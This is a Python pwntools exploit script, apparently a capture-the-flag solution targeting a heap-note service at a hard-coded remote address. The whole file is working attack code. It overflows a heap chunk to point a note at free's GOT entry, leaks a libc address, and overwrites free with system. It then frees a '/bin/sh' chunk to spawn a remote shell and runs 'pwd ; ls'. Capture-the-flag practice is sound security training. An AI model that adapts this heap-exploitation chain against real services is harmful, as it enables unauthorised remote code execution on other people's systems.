#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "78.46.224.83"
port = 1456
r = remote(host,port)

def add(size,name,txt_size,text):
    r.recvuntil("Action:")
    r.sendline("0")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(txt_size))
    r.recvuntil(":")
    r.sendline(text)

def dele(idx):
    r.recvuntil("Action:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(idx))


def update(idx,size,txt):
    r.recvuntil("Action:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(txt)

def show(idx):
    r.recvuntil("Action:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

free_got = 0x804b010
add(40,"da",20,"oranege") #0
add(20,"da",8,"dada") #1
add(20,"da",8,"dada") #2
add(20,"da",8,"dada") #3
add(20,"/bin/sh\x00",8,"/bin/sh\x00") #4
dele(3)
dele(0)
add(40,"da",0x8,"a"*0x4) #5
add(128,"da",0x8,"a"*0x4) #6
update(5,0xd8,"a"*0xd0 + p32(free_got))
show(1)
r.recvuntil("description: ")
free = u32(r.recvuntil("\n")[:4])
libc = free-0x760f0
print "libc:",hex(libc)
#libc = free-0x712f0
#system = libc + 0x3ada0
system = libc + 0x0003e3e0
update(1,8,p32(system))
dele(4)
r.sendline("pwd ; ls")
r.interactive()
